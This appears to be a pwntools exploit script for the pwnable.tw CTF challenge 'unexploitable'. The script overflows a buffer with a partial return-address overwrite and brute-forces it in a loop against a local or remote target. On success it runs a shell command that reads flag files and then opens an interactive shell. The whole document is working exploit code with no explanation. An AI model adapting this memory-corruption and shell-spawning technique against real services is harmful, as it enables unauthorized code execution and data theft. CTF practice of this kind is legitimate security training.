from pwn import *
import sys, time

b = ELF("./unexploitable")

payload = "a"*0x18
payload += "\x67\xe5\xaf"

while True:
	if len(sys.argv) == 1:
		p = process("./unexploitable", env={'LD_PRELOAD' : "./libc_64.so.6"})
	else:
		p = remote("chall.pwnable.tw", 10403)
	time.sleep(3)

	p.send(payload)
	try:
		p.sendline("cat /home/*/*flag*")
		flag = p.recv()
		print flag
		break
	except:
		pass
	p.close()


with open("flag", "w") as f:
	f.write(flag)
p.interactive()
